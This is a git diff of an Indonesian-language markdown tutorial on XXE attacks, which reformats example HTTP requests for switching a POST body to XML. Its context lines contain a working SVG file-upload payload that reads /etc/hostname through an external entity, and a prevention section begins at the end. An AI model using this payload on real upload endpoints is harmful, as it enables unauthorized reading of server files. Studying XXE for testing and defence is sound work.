@@ -28,16 +28,19 @@ Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan en
   - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
     > `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
   - Modifikasi `content-type` pada POST request header.  Ketika respons adalah `200 OK` dan menghasilkan nilai yang sama, maka kita bisa menyelipkan payload pada requesnya
-    >`POST /action HTTP/1.0`<br/>
-    >`Content-Type: application/x-www-form-urlencoded`<br/>
-    >`Content-Length: 7`<br/>
-    >`foo=bar`<br/>
-dimodif<br/>
-    >`POST /action HTTP/1.0`<br/>
-    >`Content-Type: text/xml`<br/>
-    >`Content-Length: 52`<br/>
-    >`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`<br/>
-    
+      ```
+      POST /action HTTP/1.0
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 7
+      foo=bar`<br/>
+      ```
+    dimodif<br/>
+      ```    
+      POST /action HTTP/1.0
+      Content-Type: text/xml
+      Content-Length: 52
+      <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+      ```    
 - **Prevention**
   ```
   Disable DTD
